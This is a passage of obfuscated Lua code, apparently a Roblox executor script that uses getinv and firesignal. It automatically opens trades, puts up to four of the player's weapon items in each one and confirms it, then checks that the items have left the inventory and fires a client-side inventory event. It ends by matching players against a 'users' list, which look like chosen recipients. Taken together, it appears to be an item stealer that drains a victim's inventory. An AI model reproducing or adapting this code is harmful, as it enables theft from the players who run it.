    end

    v281 = function(p44)
        local v284 = v58()
        local v285
        if v284 == "StartTrade" then
            v54(DeclineTrade)
            task.wait(0.05)
            v285 = true
        elseif v284 == "ReceivingRequest" then
            v54(DeclineRequest)
            task.wait(0.05)
            v285 = true
        else
            v285 = true
            if v284 == "SendingRequest" then v54(CancelRequest) end
        end

        local result3

        while #t1 > 0 do
            local v287 = v58()
            if v287 == "None" then
                task.spawn(v56, p44)
                task.wait(0.1)
            elseif v287 == "SendingRequest" then
                task.wait(0.05)
            elseif v287 == "ReceivingRequest" then
                v54(DeclineRequest)
                task.wait(0.05)
            elseif v287 == "StartTrade" then
                local t34 = {}
                for i = 1, math.min(4, #t1) do table.insert(t34, t1[i]) end
                local t35
                if v285 and v246 and v246.Weapons and v246.Weapons.Owned then
                    t35 = {}
                    for k, v in pairs(v246.Weapons.Owned) do t35[k] = v end
                    v285 = false
                else
                    local ok3
                    ok3, t35 = pcall(getinv)
                    t35 = ok3 and type(t35) == "table" and t35 or {}
                end
                for _, v in ipairs(t34) do
                    local Amount = v.Amount or 1
                    for i = 1, Amount do v63(v.DataID) end
                end
                v59()
                local now = tick()
                local v299 = false
                while true do
                    result3 = nil
                    if not (tick() - now < 3) then break end
                    task.wait(0.15)
                    local ok3
                    ok3, result3 = pcall(getinv)
                    if not (ok3 and type(result3) == "table" and next(result3) ~= nil) then continue end
                    for _, v in ipairs(t34) do
                        if (result3[v.DataID] or 0) < (t35[v.DataID] or 0) then
                            v299 = true
                            break
                        end
                    end
                    if v299 then break end
                end
                if v299 and result3 then
                    for _, v in ipairs(t34) do
                        local DataID = v.DataID
                        local amount = result3[DataID] or 0
                        for i = #t1, 1, -1 do
                            if t1[i].DataID == DataID then
                                if amount <= 0 then
                                    if firesignal then
                                        firesignal(game:GetService("ReplicatedStorage").Remotes.Inventory.ChangeInventoryItem.OnClientEvent, "Weapons", t1[i].DataID, t1[i].Amount)
                                    end
                                    table.remove(t1, i)
                                else
                                    t1[i].Amount = amount
                                end
                                break
                            end
                        end
                    end
                end
            else
                task.wait(0.1)
            end
            task.wait(0.1)
        end
    end

    local function v308()
        local function v309(player)
            if table.find(users, player.Name) then
